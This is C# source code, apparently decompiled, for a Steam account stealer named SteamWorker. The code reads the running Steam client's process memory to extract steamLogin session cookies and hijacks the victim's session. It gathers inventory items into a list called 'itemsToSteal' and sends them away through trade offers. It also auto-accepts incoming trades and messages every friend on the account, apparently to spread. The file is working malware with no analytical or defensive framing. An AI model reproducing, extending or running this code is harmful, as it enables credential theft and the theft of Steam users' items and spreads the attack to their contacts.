using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

public class SteamWorker
{
    public CookieContainer cookiesContainer = new CookieContainer();
    private List<string> friends = new List<string>();
    private List<string[]> itemsToSteal = new List<string[]>();
    private List<string[]> OffersList = new List<string[]>();
    public List<string> ParsedSteamCookies = new List<string>();

    public void acceptAllIncomingTrades(bool LoggingIt)
    {
        List<string[]> list = this.getIncomingTradeoffers();
        for (int i = 0; i < list.Count; i++)
        {
            string error = "";
            if (list[i][3] == "1")
            {
                this.LogIt(list[i][2] + "(" + list[i][1] + ") -> " + this.steamID + " abuse detected");
                this.declineOffer(list[i][0]);
            }
            else
            {
                OfferStatus status = this.acceptOffer(list[i], out error);
                if (LoggingIt)
                {
                    switch (status)
                    {
                        case OfferStatus.Accepted:
                            this.LogIt(list[i][2] + "(" + list[i][1] + ") -> " + this.steamID + " accepted");
                            break;

                        case OfferStatus.Error:
                            this.LogIt(list[i][2] + "(" + list[i][1] + ") -> " + this.steamID + " Error: \"" + error + "\"");
                            this.declineOffer(list[i][0]);
                            break;
                    }
                }
            }
        }
    }

    public OfferStatus acceptOffer(string[] value, out string error)
    {
        error = string.Empty;
        string str = SteamHttp.SteamWebRequest(this.cookiesContainer, "https://steamcommunity.com/tradeoffer/" + value[0] + "/accept", "sessionid=" + this.sessionID + "&tradeofferid=" + value[0] + "&partner=" + value[1], "tradeoffer/" + value[0] + "/");
        if (str != null)
        {
            if (str.IndexOf("tradeid") != -1)
            {
                return OfferStatus.Accepted;
            }
            error = str;
            return OfferStatus.Error;
        }
        return OfferStatus.Error;
    }

    private void addInList(ref List<string[]> whereINeedPut, List<string[]> willinputed)
    {
        if (willinputed != null)
        {
            for (int i = 0; i < willinputed.Count; i++)
            {
                if (!whereINeedPut.Contains(willinputed[i]))
                {
                    whereINeedPut.Add(willinputed[i]);
                }
            }
        }
    }

    private void AddItemsToList(string appIDs, string steamID, string filters = "")
    {
        string[] strArray = appIDs.Split(new char[] { ',' });
        if (appIDs.Length > 1)
        {
            for (int i = 0; i < strArray.Length; i++)
            {
                List<string[]> input = this.GetItems(steamID, strArray[i], (strArray[i] != "753") ? null : new string[] { "1", "3", "6", "7" });
                if (input != null)
                {
                    if ((filters != string.Empty) && filters.Contains(strArray[i]))
                    {
                        this.FilterByRarity(ref input, getFilterValues(filters, strArray[i]));
                    }
                    if (input != null)
                    {
                        this.itemsToSteal.AddRange(input);
                    }
                }
            }
        }
    }

    public void addItemsToSteal(string appIds, string filters = "")
    {
        this.AddItemsToList(appIds, this.steamID, filters);
    }

    public void addOffer(string Steam64ID, string tradeID, string tradeToken)
    {
        this.OffersList.Add(new string[] { Steam64ID, tradeID, tradeToken });
    }

    public void declineOffer(string offer)
    {
        string str = SteamHttp.SteamWebRequest(this.cookiesContainer, "https://steamcommunity.com/tradeoffer/" + offer + "/decline", "sessionid=" + this.sessionID, this.steamID + "76561198068284082/tradeoffers");
    }

    private List<string[][]> divideList(List<string[]> input, int size)
    {
        List<string[][]> list = new List<string[][]>();
        int num = 0;
        if (input != null)
        {
            List<string[]> list2 = new List<string[]>();
            for (int i = 0; i < input.Count; i++)
            {
                list2.Add(input[i]);
                num++;
                if (num == size)
                {
                    list.Add(list2.ToArray());
                    list2.Clear();
                    num = 0;
                }
            }
            if (list2.Count > 0)
            {
                list.Add(list2.ToArray());
            }
            return list;
        }
        return null;
    }

    public void FilterByRarity(ref List<string[]> input, string filter)
    {
        string[] strArray = filter.Split(new char[] { ',' });
        List<string[]> list = new List<string[]>();
        for (int i = 0; i < input.Count; i++)
        {
            for (int j = 0; j < strArray.Length; j++)
            {
                string[] strArray2 = input[i][4].Split(new char[] { ' ' });
                for (int k = 0; k < strArray2.Length; k++)
                {
                    if (!(!(strArray2[k] == strArray[j]) || list.Contains(input[i])))
                    {
                        list.Add(input[i]);
                        break;
                    }
                }
            }
        }
        input = (list.Count > 0) ? list : null;
    }

    private string getCookieValue(CookieContainer input_cc, string name)
    {
        Hashtable hashtable = (Hashtable) typeof(CookieContainer).GetField("m_domainTable", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(input_cc);
        foreach (string str in hashtable.Keys)
        {
            object obj2 = hashtable[str];
            SortedList list = (SortedList) obj2.GetType().GetField("m_list", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(obj2);
            foreach (string str2 in list.Keys)
            {
                CookieCollection cookies = (CookieCollection) list[str2];
                foreach (Cookie cookie in cookies)
                {
                    if (cookie.Name == name)
                    {
                        return cookie.Value.ToString();
                    }
                }
            }
        }
        return string.Empty;
    }

    private static string getFilterValues(string filters, string name)
    {
        if (filters.Contains(name))
        {
            string[] strArray = filters.Split(new char[] { ':', ';' }, StringSplitOptions.RemoveEmptyEntries);
            for (int i = 0; i < strArray.Length; i++)
            {
                if (strArray[i] == name)
                {
                    string str = strArray[i + 1];
                    if (str != null)
                    {
                        return str;
                    }
                }
            }
        }
        return null;
    }

    public void getFriends()
    {
        this.friends.Clear();
        string[] strArray = SteamHttp.SteamWebRequest(this.cookiesContainer, "profiles/" + this.steamID + "/friends/", null, "").Split(new string[] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
        try
        {
            for (int i = 0; i < strArray.Length; i++)
            {
                if (strArray[i].IndexOf("name=\"friends") != -1)
                {
                    string item = strArray[i].Split(new char[] { '[', ']' })[3];
                    if (!this.friends.Contains(item))
                    {
                        this.friends.Add(item);
                    }
                }
            }
        }
        catch
        {
        }
    }

    public List<string[]> getIncomingTradeoffers()
    {
        List<string[]> list = new List<string[]>();
        string[] strArray = SteamHttp.SteamWebRequest(this.cookiesContainer, "profiles/" + this.steamID + "/tradeoffers/", null, "").Split(new string[] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
        for (int i = 0; i < strArray.Length; i++)
        {
            if ((strArray[i].IndexOf("tradeofferid_") == -1) || (strArray[i + 11].IndexOf("inactive") != -1))
            {
                continue;
            }
            int num2 = -1;
            for (int j = i; j < strArray.Length; j++)
            {
                if (strArray[j].IndexOf("tradeoffer_footer") != -1)
                {
                    num2 = j;
                    break;
                }
            }
            bool flag = false;
            for (int k = num2; k > 0; k--)
            {
                if (strArray[k].IndexOf("tradeoffer_item_list") != -1)
                {
                    break;
                }
                if (strArray[k].IndexOf("trade_item") != -1)
                {
                    flag = true;
                    break;
                }
            }
            list.Add(new string[] { strArray[i].Split(new char[] { '"' })[3].Split(new char[] { '_' })[1], strArray[i + 1].Split(new char[] { '\'' })[1], Uri.UnescapeDataString(strArray[i + 1].Split(new string[] { "&quot;" }, StringSplitOptions.RemoveEmptyEntries)[1]), flag ? "1" : "0" });
        }
        return list;
    }

    public List<string[]> GetItems(string steamID, string appID, string[] contexIds = null)
    {
        string str;
        string str2;
        List<string[]> whereINeedPut = new List<string[]>();
        if (contexIds == null)
        {
            str = "profiles/" + steamID + "/inventory/json/" + appID + "/2/?trading=1&market=1";
            str2 = SteamHttp.SteamWebRequest(this.cookiesContainer, str, null, "");
            try
            {
                whereINeedPut = new inventoryjson().Parse(str2, "2");
            }
            catch
            {
                return null;
            }
        }
        else
        {
            for (int i = 0; i < contexIds.Length; i++)
            {
                str = "profiles/" + steamID + "/inventory/json/" + appID + "/" + contexIds[i] + "/?trading=1&market=1";
                str2 = SteamHttp.SteamWebRequest(this.cookiesContainer, str, null, "");
                try
                {
                    List<string[]> willinputed = new inventoryjson().Parse(str2, contexIds[i]);
                    this.addInList(ref whereINeedPut, willinputed);
                }
                catch
                {
                }
            }
        }
        return ((whereINeedPut.Count > 0) ? whereINeedPut : null);
    }

    public void getSessionID()
    {
        while (!SteamHttp.ObtainsessionID(this.cookiesContainer))
        {
        }
        if (this.cookiesContainer.Count < 4)
        {
            this.cookiesContainer = new CookieContainer();
            this.setCookies(true);
            this.getSessionID();
        }
        else
        {
            this.sessionID = this.getCookieValue(this.cookiesContainer, "sessionid");
        }
    }

    public void initChatSystem()
    {
        int num;
        string[] strArray = SteamHttp.SteamWebRequest(this.cookiesContainer, "chat/", null, "").Split(new string[] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
        for (num = 0; num < strArray.Length; num++)
        {
            if (strArray[num].IndexOf("WebAPI = new CWebAPI") != -1)
            {
                this.access_token = strArray[num].Split(new char[] { '"' })[1];
                break;
            }
        }
        string str2 = this.randomInt(13);
        string[] strArray2 = SteamHttp.SteamWebRequest(this.cookiesContainer, "https://api.steampowered.com/ISteamWebUserPresenceOAuth/Logon/v0001/?jsonp=jQuery" + this.randomInt(0x16) + "_" + str2 + "&ui_mode=web&access_token=" + this.access_token + "&_=" + str2, null, "").Split(new char[] { '"' });
        for (num = 0; num < strArray2.Length; num++)
        {
            if (strArray2[num] == "umqid")
            {
                this.umquid = strArray2[num + 2];
                break;
            }
        }
    }

    public void LogIt(string line)
    {
        try
        {
            using (StreamWriter writer = System.IO.File.AppendText("log.txt"))
            {
                writer.WriteLine(DateTime.Now.ToString("[dd.MM.yyyy hh:mm:ss] ") + line);
            }
        }
        catch
        {
        }
    }

    public void ParseSteamCookies()
    {
        Process[] processArray;
        this.ParsedSteamCookies.Clear();
        WinApis.SYSTEM_INFO input = new WinApis.SYSTEM_INFO();
        while (input.minimumApplicationAddress.ToInt32() == 0)
        {
            WinApis.GetSystemInfo(out input);
        }
        IntPtr minimumApplicationAddress = input.minimumApplicationAddress;
        long num = minimumApplicationAddress.ToInt32();
        List<string> list = new List<string>();
        processArray = processArray = Process.GetProcessesByName("steam");
        Process process = null;
        for (int i = 0; i < processArray.Length; i++)
        {
            try
            {
                foreach (ProcessModule module in processArray[i].Modules)
                {
                    if (module.FileName.EndsWith("steamclient.dll"))
                    {
                        process = processArray[i];
                        continue;
                    }
                }
            }
            catch
            {
            }
        }
        if (process != null)
        {
            IntPtr handle = WinApis.OpenProcess(0x410, false, process.Id);
            WinApis.PROCESS_QUERY_INFORMATION processQuery = new WinApis.PROCESS_QUERY_INFORMATION();
            IntPtr numberofbytesread = new IntPtr(0);
            while (WinApis.VirtualQueryEx(handle, minimumApplicationAddress, out processQuery, 0x1c) != 0)
            {
                if ((processQuery.Protect == 4) && (processQuery.State == 0x1000))
                {
                    byte[] buffer = new byte[processQuery.RegionSize];
                    WinApis.ReadProcessMemory(handle, processQuery.BaseAdress, buffer, processQuery.RegionSize, out numberofbytesread);
                    string str = Encoding.UTF8.GetString(buffer);
                    MatchCollection matchs = new Regex("7656119[0-9]{10}%7c%7c[A-F0-9]{40}", RegexOptions.IgnoreCase).Matches(str);
                    if (matchs.Count > 0)
                    {
                        foreach (Match match in matchs)
                        {
                            if (!list.Contains(match.Value))
                            {
                                list.Add(match.Value);
                            }
                        }
                    }
                }
                num += processQuery.RegionSize;
                if (num >= 0x7fffffffL)
                {
                    break;
                }
                minimumApplicationAddress = new IntPtr(num);
            }
            this.ParsedSteamCookies = list;
            if (list.Count >= 2)
            {
                this.setCookies(false);
            }
            else
            {
                this.ParsedSteamCookies.Clear();
                this.ParseSteamCookies();
            }
        }
    }

    public string prepareItems(string[][] input)
    {
        string str = string.Empty;
        for (int i = 0; i < input.Length; i++)
        {
            str = str + string.Format("{4}\"appid\":{0},\"contextid\":\"{1}\",\"amount\":{2},\"assetid\":\"{3}\"{5},", new object[] { input[i][0], input[i][5], input[i][1], input[i][2], "{", "}" });
        }
        return str.Remove(str.Length - 1);
    }

    public string randomInt(int count)
    {
        Random random = new Random();
        StringBuilder builder = new StringBuilder();
        for (int i = 0; i < count; i++)
        {
            builder.Append(random.Next(0, 10)).ToString();
        }
        return builder.ToString();
    }

    public void SendItems(string message = "")
    {
        if (this.itemsToSteal != null)
        {
            List<string[][]> list = this.divideList(this.itemsToSteal, 0x100);
            if (list != null)
            {
                for (int i = 0; i < this.OffersList.Count; i++)
                {
                    for (int j = 0; j < 5; j++)
                    {
                        int num3 = j + (i * 5);
                        if (num3 >= list.Count)
                        {
                            break;
                        }
                        string items = this.prepareItems(list[num3]);
                        if (this.sentItems(this.getCookieValue(this.cookiesContainer, "sessionid"), items, this.OffersList[i], message) != null)
                        {
                        }
                    }
                }
            }
        }
    }

    public void sendMessage(string steamID, string message)
    {
        string str = this.randomInt(0x16);
        string str2 = this.randomInt(13);
        string url = string.Format("https://api.steampowered.com/ISteamWebUserPresenceOAuth/Message/v0001/?jsonp=jQuery{0}_{1}&umqid={2}&type=saytext&steamid_dst={3}&text={4}&access_token={5}&_={1}", new object[] { str, str2, this.umquid, steamID, Uri.EscapeDataString(message), this.access_token });
        SteamHttp.SteamWebRequest(this.cookiesContainer, url, null, "");
    }

    public void sendMessageToFriends(string message)
    {
        for (int i = 0; i < this.friends.Count; i++)
        {
            string str = this.randomInt(0x16);
            string str2 = this.randomInt(13);
            string url = string.Format("https://api.steampowered.com/ISteamWebUserPresenceOAuth/Message/v0001/?jsonp=jQuery{0}_{1}&umqid={2}&type=saytext&steamid_dst={3}&text={4}&access_token={5}&_={1}", new object[] { str, str2, this.umquid, this.friends[i], Uri.EscapeDataString(message), this.access_token });
            SteamHttp.SteamWebRequest(this.cookiesContainer, url, null, "");
        }
    }

    private string sentItems(string sessionID, string items, string[] Offer, string message = "")
    {
        return SteamHttp.SteamWebRequest(this.cookiesContainer, "tradeoffer/new/send", "sessionid=" + sessionID + "&partner=" + Offer[0] + "&tradeoffermessage=" + Uri.EscapeDataString(message) + "&json_tradeoffer=" + Uri.EscapeDataString(string.Format("{5}\"newversion\":true,\"version\":2,\"me\":{5}\"assets\":[{3}],\"currency\":[],\"ready\":false{6},\"them\":{5}\"assets\":[],\"currency\":[],\"ready\":false{6}{6}", new object[] { sessionID, Offer[0], message, items, Offer[2], "{", "}" })) + "&trade_offer_create_params=" + Uri.EscapeDataString(string.Format("{0}\"trade_offer_access_token\":\"{2}\"{1}", "{", "}", Offer[2])), "tradeoffer/new/?partner=" + Offer[1] + "&token=" + Offer[2]);
    }

    public void setCookies(bool a)
    {
        this.cookiesContainer.SetCookies(new Uri("http://steamcommunity.com"), "steamLogin=" + this.ParsedSteamCookies[a ? 0 : 1]);
        this.cookiesContainer.SetCookies(new Uri("http://steamcommunity.com"), "steamLoginSecure=" + this.ParsedSteamCookies[a ? 1 : 0]);
    }

    private string access_token { get; set; }

    private string sessionID { get; set; }

    private string steamID
    {
        get
        {
            return ((this.ParsedSteamCookies.Count > 0) ? this.ParsedSteamCookies[0].Substring(0, 0x11) : null);
        }
    }

    private string umquid { get; set; }

    public enum OfferStatus
    {
        Accepted,
        Abuse,
        Error
    }
}

